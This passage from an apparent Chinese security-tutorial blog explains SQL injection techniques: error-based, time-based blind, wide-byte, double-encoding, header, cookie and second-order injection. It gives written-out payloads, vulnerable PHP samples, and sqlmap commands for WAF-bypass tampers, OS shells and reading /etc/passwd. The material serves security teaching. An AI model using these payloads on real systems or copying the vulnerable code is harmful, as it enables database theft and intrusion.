rel="noopener">floor报错分析</a></p></blockquote><hr><ol start="2"><li><code>extractvalue()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue('hello', ./test.xml);  // 报错最大长度32位<br>and (extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">'hello'</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">'~'</span>,<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>)))  // 优化<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>若路径出现一些特殊字符如<code>~</code>，触发报错，将包括特殊字符在内的后面内容报出</p></blockquote><hr><ol start="3"><li><code>updatexml()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))  // 报错最大长度<span class="hljs-number">32</span>位，优化同上<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="盲注之时间注入"><a href="#盲注之时间注入" class="headerlink" title="盲注之时间注入"></a>盲注之时间注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>配合其它注入法，如bool注入。<br>无论是否有结果，sql语句只要执行了，就可根据页面响应时长，判断语句是否被执行</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>sleep()</code>，<code>benchmark()</code><br>基本用法：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>))<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">benchmark</span>(<span class="hljs-number">2000000</span>,<span class="hljs-keyword">md5</span>(<span class="hljs-string">'a'</span>)),<span class="hljs-keyword">benchmark</span>(<span class="hljs-number">5000000</span>,<span class="hljs-keyword">md5</span>(<span class="hljs-string">'a'</span>)))<br></code></pre></td></tr></table></figure></p><p>例子：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and if((ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">101</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></p><hr><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>在使用PHP连接MySQL时，当设置<code>set character_set_client=gbk</code>时会导致一个编码转换注入的问题，即宽字节注入。</p><p><code>GBK</code>编码<br>是对<code>GB2312</code>编码的扩展。采用双字节编码方案，编码范围：<br><code>8140~FEFE</code><br><a href="http://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php" target="_blank" rel="noopener"><strong>编码表</strong></a></p><p>后台使用了过滤函数，如：</p><blockquote><p><code>addslashes()</code> 对<code>&#39;</code>，<code>&quot;</code>，<code>\</code>和<code>NULL</code>（NULL字符）进行处理<br><code>mysql_real_escape_string()</code> 过滤<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code><br><code>mysql_escape_string()</code> php5.3已弃用，与完全一样，除了 mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。</p></blockquote><hr><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>当存在此漏洞时，在注入的参数里加入<code>%df%27</code>，即可把程序中过滤的<code>\</code>（即<code>%5c</code>）“吃掉”，%df%5c拼接为gbk编码的“運”<br>例如：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">/1.php?id=1%27 and 1=1%23  <span class="hljs-comment"># 失败的注入语句</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1\' and 1=1#'</span>  <span class="hljs-comment">#过滤后后台实际执行语句</span><br><br>/<span class="hljs-number">1.</span>php?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>%<span class="hljs-number">23</span>  <span class="hljs-comment"># 成功的注入语句</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1運'</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-comment">#'  # 后台实际执行语句</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><p>若是为了避免宽字节注入的产生，可限定使用<code>mysql_set_charset(GBK)</code>来指定字符集，并且使用<code>mysql_real_escape_string</code>进行转义</p><hr><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><blockquote><p>url编码是一种浏览器用来打包表单输入的格式。url编码就是一个字符ascii码的十六进制，前面还需加上<code>%</code><br>例如<code>\</code>的ascii码是92，92的十六进制是<code>5c</code>，所以<code>\</code>的url编码就是<code>%5c</code></p></blockquote><hr><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>Web程序中使用了<code>urldecode()</code>或<code>rawurldecode()</code>来解码<code>id</code>参数<br>提交参数到WebServer时，WebServer会自动解码生成单引号而引发注入</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>%25</code>被解码后被转换为<code>%</code><br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-number">1.</span>php?id=<span class="hljs-number">1</span>%<span class="hljs-number">2527</span>  <span class="hljs-comment">// URL中语句</span><br>id=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>  <span class="hljs-comment">// 实际执行语句，产生单引号成功闭合</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="HTTP请求头注入"><a href="#HTTP请求头注入" class="headerlink" title="HTTP请求头注入"></a>HTTP请求头注入</h3><h4 id="请求头定义"><a href="#请求头定义" class="headerlink" title="请求头定义"></a>请求头定义</h4><p>HTTP客户端（例如浏览器），向服务器发送请求时必须指明请求类型（一般为<code>GET</code>或者<code>POST</code>）。如有必要，客户程序还可以选择发送其它请求头。</p><hr><h4 id="常见请求头"><a href="#常见请求头" class="headerlink" title="常见请求头"></a>常见请求头</h4><p><code>User-agent</code> 浏览器版本信息</p><blockquote><p><code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</code></p></blockquote><p><code>referer</code> 包含一个URL，指明用户从该URL代表的页面出发访问当前请求的页面</p><blockquote><p><code>https://www.google.co.jp</code></p></blockquote><p><code>X-Forwarded-For</code> 即<code>XFF</code>，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><blockquote><p>192.168.0.2</p></blockquote><p><code>Cookie</code> 总是保存在客户端中，一般会以文件的方式存储在硬盘中，我们通过一些插件可以修改<code>Cookie</code>内容</p><blockquote><p>user:admin_12536223782183</p></blockquote><hr><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><p>常用操作http请求头的工具<br><code>Burpsuite</code> 抓包修改请求头<br><code>Chrome</code> 扩展<code>ModeHeader</code><br><code>FireFox</code> 扩展<code>Header Editor</code></p><hr><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><ul><li><p>常见处理<code>user-agent</code>方法：</p><blockquote><p><code>user-agent</code>很少会带入到数据库中进行处理，一般被用来判断客户端类型<br>例如： <code>PHP</code>使用<code>jenssegers/agent</code>库处理，判断是PC、移动端或者机器</p></blockquote></li><li><p>常见处理<code>referer</code>方法：</p><blockquote><p><code>referer</code>很少会带入数据库中，它主要功能是用来验证请求来源<br>用来防御csrf漏洞</p></blockquote></li><li><p>常见处理<code>Cookie</code>方法：</p><blockquote><p><code>Cookie</code>主要用来存储用户的认证信息，经常会带入到数据库中进行查询<br>在老旧的站点中，会直接将用户信息存储在cookie中，如果使用时直接带入数据库中进行查询，就可能出现<code>SQL注入</code>问题</p></blockquote></li></ul><blockquote><p>后端PHP处理<code>Cookie</code><br>验证账户信息，为客户端设置<code>Cookie</code>的示例代码：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">$sql = <span class="hljs-string">"SELECT * FROM `users` WHERE `username` = '&#123;$username&#125;'"</span>;<br>$data = mysql_query($sql, $conn) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysql_error());<br>$userinfo = mysql_fetch_array($data);<br><span class="hljs-keyword">if</span>(md5($password) == $userinfo[<span class="hljs-string">'password'</span>]) &#123;<br>    setcookie(<span class="hljs-string">'usre'</span>, $userinfo[<span class="hljs-string">'username'</span>], time() + <span class="hljs-number">3600</span>);<br>    setcookie(<span class="hljs-string">'background'</span>, $userinfo[<span class="hljs-string">'background'</span>], time() + <span class="hljs-number">3600</span>);<br>&#125;<br></code></pre></td></tr></table></figure></p></blockquote><blockquote><p>在进行敏感操作时，验证并使用cookie中的用户信息：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'user'</span>])) &#123;<br>header(<span class="hljs-string">"Location: login.php"</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br>$sql = <span class="hljs-string">"SELECT * FROM `messages` WHERE `author` = '&#123;$_COOKIE['user']&#125;';"</span>;<br>$data = mysql_query($sql, $conn) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysql_error());<br><span class="hljs-keyword">while</span> ($com = mysql_fetch_array($data)) &#123;<br>    $message = $com[<span class="hljs-string">'message'</span>];<br>    $title = $com[<span class="hljs-string">'title'</span>];<br>    $id = $com[<span class="hljs-string">'id'</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;标题： &lt;a href='index.php?id=&#123;$id&#125;'&gt;&#123;$title&#125;&lt;/a&gt;&lt;/h1&gt;&lt;/h3&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a href='del.php?id=&#123;$id&#125;'&gt;删除消息&lt;/a&gt;&lt;br /&gt;"</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>Cookie</code>中的用户信息直接带入到数据库中，可以直接进行注入攻击<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">Cookie: user=zs&apos; and 1--|<br></code></pre></td></tr></table></figure></p></blockquote><ul><li>常见处理<code>X-Forwarded-For</code>方法<blockquote><p>调用函数后，获取结果，直接带入数据库中进行更新操作</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(md5($password) == $userinfo[<span class="hljs-string">'password'</span>]) &#123;<br>    setcookie(<span class="hljs-string">'user'</span>, $userinfo[<span class="hljs-string">'username'</span>], time() + <span class="hljs-number">3600</span>);<br>    setcookie(<span class="hljs-string">'background'</span>, $userinfo[<span class="hljs-string">'background'</span>], time() + <span class="hljs-number">3600</span>);<br>    setcookie(<span class="hljs-string">'lastip'</span>, $userinfo[<span class="hljs-string">'lastip'</span>], time() + <span class="hljs-number">3600</span>);<br>    $sql = <span class="hljs-string">"UPDATE `user` SET `lastip` = '&#123;$realip&#125;' WHERE `username` = '&#123;$username&#125;'"</span>;<br>    mysql_query($sql, $conn) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysql_error());<br>    header(<span class="hljs-string">"Location: add.php"</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script language="JavaScript" type="text/javascript"&gt;alert("你的用户名或密码错误");&lt;/script&gt;'</span><br>&#125;<br></code></pre></td></tr></table></figure></blockquote></li></ul><hr><h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这些数据却又在“未被转义（Unescaped）”的查询窗体中重复使用。此时，攻击者可能注入的是一个PAYLOAD，这样就会构成一个SQL查询语句并被执行，这就是所谓的二阶SQL注入。</p><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p><strong><code>Second-order SQL injection</code></strong><br>当用户提供的数据由应用程序存储并随后以不安全的方式合并到SQL查询中时，会出现二阶SQL注入。要检测漏洞，通常需要在一个位置提交合适的数据，然后使用其他一些以不安全的方式处理数据的应用程序功能</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>普通注入  </p><ol><li>在http后面构造语句，是立即直接生效的</li><li>一次注入很容易被扫描工具扫描到</li></ol><p>二阶注入</p><ol><li>先构造语句（有被转义字符的语句）</li><li>我们构造的恶意语句存入数据库</li><li>第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）</li><li>二次注入更加难以被发现</li></ol><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li>攻击者在http请求中提交恶意输入</li><li>恶意输入保存在数据库中</li><li>攻击者提交第二次http请求</li><li>为处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造SQL语句</li><li>若攻击成功，在第二次请求相应中返回结果</li></ol><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># reg $uname = addslashes($_POST['uname']);</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`users`</span> (<span class="hljs-string">`uname`</span>,<span class="hljs-string">`upass`</span>) <span class="hljs-keyword">VALUES</span> ($uname, <span class="hljs-keyword">md5</span>($upass));<br><span class="hljs-comment"># login $uname = addslashes($_POST['uname']);</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-string">`users`</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-string">`uname`</span> = $uname;<br><span class="hljs-comment"># show message $_SESSION['uname'] = $db['uname'];</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-string">`messages`</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-string">'uname'</span> = <span class="hljs-string">'$_SESSION["uname"]'</span>;<br><span class="hljs-comment"># uname = admin' and sleep(5); -- l</span><br></code></pre></td></tr></table></figure><hr><h2 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h2><h3 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h3><ul><li>用户能控制输入的内容</li><li>Web应用把用户输入的内容带入数据库中执行</li></ul><hr><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><h4 id="常用参数命令"><a href="#常用参数命令" class="headerlink" title="常用参数命令"></a>常用参数命令</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">"url"</span> --dbs<br>sqlmap -u <span class="hljs-string">"url"</span> -D 库名 --tables<br>sqlmap -u <span class="hljs-string">"url"</span> -D 库名 -T 表名 --columns<br>sqlmap -u <span class="hljs-string">"url"</span> -D 库名 -T 表名 -C 列名 --dump<br></code></pre></td></tr></table></figure><p>常用参数：<br><code>-v</code> 显示细节<br><code>-r</code> 加载请求包（常用于post注入）<br><code>-p</code> 常见于多个注入点时选择注入点，例如头注入：cookie，referer，x-forward-for<br><code>--dbms=</code> 选择数据库类型如mysql，mssql等<br><code>--cookie=</code> 添加测试目标网站的cookie，适用与登陆后才有注入点的网站<br><code>--user-agent=</code><br><code>--proxy=</code><a href="http://127.0.0.1:1080" target="_blank" rel="noopener">http://127.0.0.1:1080</a><br><code>--threads=</code>线程数（默认是1）<br><code>--sql-shell</code> 虚拟出一个sql终端，可以执行sql命令<br><code>--os-shell</code> 虚拟出一个系统命令终端，可以执行系统命令</p><h4 id="支持的数据库"><a href="#支持的数据库" class="headerlink" title="支持的数据库"></a>支持的数据库</h4><p>12种数据库被支持：<br>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、informix、HsqlDB</p><h4 id="显示等级-v-参数"><a href="#显示等级-v-参数" class="headerlink" title="显示等级(-v 参数)"></a>显示等级(-v 参数)</h4><p>若需要观察sqlmap对一个点进行了怎样的尝试判断以及读取数据的，可以使用-v参数<br>共计7个等级，默认为1：</p><ol start="0"><li>只显示python错误以及严重的信息</li><li>同时显示基本信息和警告信息（默认）</li><li>同时显示debug信息</li><li>同时显示注入的payload</li><li>同时显示HTTP请求</li><li>同时显示HTTP响应头</li><li>同时显示HTTP相应页面</li></ol><hr><h4 id="tamper使用"><a href="#tamper使用" class="headerlink" title="tamper使用"></a>tamper使用</h4><p>sqlmap中的tamper自带许多防过滤脚本。通过自带的或自行编写的tamper，可以帮助绕过waf进行自动化攻击。<br>常见tamper如下：</p><ul><li><p><strong><code>apostrophemask.py</code></strong><br>用utf8代替引号</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">("1 AND '1'='1'")<br>'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'<br></code></pre></td></tr></table></figure></li><li><p><strong><code>base64encode.py</code></strong><br>用base64编码替换</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">("1' AND SLEEP(5)<span class="hljs-comment">#")</span><br>'MScgQU5EIFNMRUVQKDUpIw=='<br></code></pre></td></tr></table></figure></li><li><p><strong><code>multiplespaces.py</code></strong><br>围绕SQL关键字添加多个空格</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('1 UNION <span class="hljs-keyword">SELECT</span> foobar<span class="hljs-string">')<br>'</span><span class="hljs-number">1</span>      <span class="hljs-keyword">UNION</span>     <span class="hljs-keyword">SELECT</span>     foobar<span class="hljs-string">'</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>space2plus.py</code></strong><br>用<code>+</code>替换空格</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span><span class="hljs-string">')<br>'</span><span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">id</span>+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span><span class="hljs-string">'</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>nonrecursivereplacement.py</code></strong><br>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（eg：.replace(“SELECT”,””)）filters</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('1 UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">2</span><span class="hljs-comment">--')</span><br><span class="hljs-string">'1 UNIOUNIONN SELESELECTCT 2--'</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>space2randomblank.py</code></strong><br>代替空格字符，从可选空白字符的有效集随机选取一个</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span><span class="hljs-string">')<br>'</span><span class="hljs-keyword">SELECT</span>%<span class="hljs-number">0</span>Did%<span class="hljs-number">0</span>DFROM%<span class="hljs-number">0</span>Ausers<span class="hljs-string">'</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>unionalltounion.py</code></strong><br>替换UNION ALL SELECT UNION SELECT</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('-1 UNION ALL <span class="hljs-keyword">SELECT</span><span class="hljs-string">')<br>'</span><span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><span class="hljs-string">'</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>securesphere.py</code></strong><br>追加特制的字符串</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">('1 AND 1=1')<br>"1 AND 1=1 and '0having'='0having'"<br></code></pre></td></tr></table></figure></li></ul><hr><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>sqlmap读文件需满足以下条件</p><ol><li><strong>读文件权限</strong>：</li></ol><ul><li>secure-file-priv(show variables)</li><li>目录权限</li><li>Selinux</li><li>apparmor</li><li>等等</li></ul><ol start="2"><li><strong>max_allowed_packed</strong></li><li>知道绝对路径</li></ol><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>与读文件条件大同小异<br>方法<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">load_file(<span class="hljs-string">'c://windows//win.ini'</span>)<br>load_file(0x633A2F2F77696E646F77732F2F77696E2E696E69)  <span class="hljs-comment"># 16进制</span><br>load_file(char(99,58,47,47,119,105,110,100,111,119,115,47,47,119,105,110,46,105,110,105))  <span class="hljs-comment"># 10进制</span><br><br>Sqlmap -u <span class="hljs-string">"http://127.0.0.1/1.php?id=1"</span> --file-read <span class="hljs-string">"/etc/passwd"</span><br></code></pre></td></tr></table></figure></p><p><strong><code>tip</code></strong>：mysql注入一般是获取内容，因为大概率情况不允许读写文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> Injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试基础</title>
      <link href="/2018/12/27/Penetration-Testing/"/>
      <url>/2018/12/27/Penetration-Testing/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>渗透测试（Penetration test）</strong></p><blockquote><p>通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。此过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。提供渗透测试服务的安全公司或组织都需要职业化渗透测试者组成的专业团队，一般称其为<strong>渗透测试工程师</strong></p></blockquote><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>是一个渐进的并且逐步深入的过程；使用不影响业务系统正常运行的攻击方法进行的测试。</p><hr><h2 id="相关基础"><a href="#相关基础" class="headerlink" title="相关基础"></a>相关基础</h2><h3 id="常用名词"><a href="#常用名词" class="headerlink" title="常用名词"></a>常用名词</h3><p><strong><code>APT(Advanced Persistent Threat)</code></strong>：高级持续性威胁。利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式<br><strong><code>CNNVD</code></strong>：中国国家漏洞库，由中国信息安全测评中心维护<br><strong><code>CNVD</code></strong>：中国国家信息安全漏洞共享平台，由国家计算机网络应急技术处理协调中心维护<br><strong><code>CVE(Common Vulerability and Exposures)</code></strong>：此漏洞库为每个确认的公开披露安全漏洞提供了索引CVE编号，此编号作为安全业界该漏洞的标准索引号<br><strong><code>NSA(National Security Agency)</code></strong>：美国国家安全局，又称国家保密局。是美国政府机构中最大的情报部门，专门负责手机和分析外国及本国通讯资料，隶属于美国国防部<br><strong><code>OWASP(Open Web Application Security Project)</code></strong>：作为非营利组织，不附属于任何企业或财团。因此，OWASP提供和开发的所有设施和文件都不受商业因素的影响<br><strong><code>网站后门(WebShell)</code></strong>：一个命令执行环境，可以上传、下载文件，查看数据库，命令执行等<br><strong><code>Shellcode</code></strong>：最初指溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞所执行的代码。<br><strong><code>Exploit</code></strong>：通常表示完整编写好的漏洞利用工具或程序，exploit往往包含shellcode<br><strong><code>POC(Proof Of Concept)</code></strong>：一段证明漏洞存在的程序代码片段<br><strong><code>0Day</code></strong>：指一些未被公布补丁的漏洞，或仍未被漏洞发现者公布出来的漏洞利用工具，对网络安全具有巨大威胁性<br><strong><code>1Day</code></strong>：与0Day不同，指一些漏洞刚被公开不久，还未被修补</p><hr><h3 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h3><p><strong>黑盒测试</strong></p><blockquote><p>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透测试</p></blockquote><p><strong>白盒测试</strong></p><blockquote><p>渗透测试者在拥有客户组织所有知识的情况下进行的的渗透测试</p></blockquote><hr><h2 id="过程环节"><a href="#过程环节" class="headerlink" title="过程环节"></a>过程环节</h2><h3 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h3><p>通常与客户组织进行讨论，确定渗透测试的范围和目标。此阶段关键为需要使客户组织明确清晰地了解渗透测试将涉及哪些目标。也提供了机会，说服客户走出全范围渗透测试的理想化愿景，选择更加现实可行的渗透测试目标来进行实际实施</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用一切可利用方法，尝试收集更多关于目标网站、服务器、管理员等信息<br>可以用的情报搜集方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。而对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报是否充分很大程度上决定渗透测试的成败。</p><h3 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h3><p>使用在情报搜集阶段获取的信息，标识出目标系统上可能存在的安全漏洞与弱点。<br>在进行威胁建模时，将所确定为最为高效的攻击方法、所需进一步获取的信息、以及从哪攻破目标系统。此阶段通常需要将客户组织作为敌手看待，然后以攻击者视角与思维尝试利用目标系统的弱点</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" 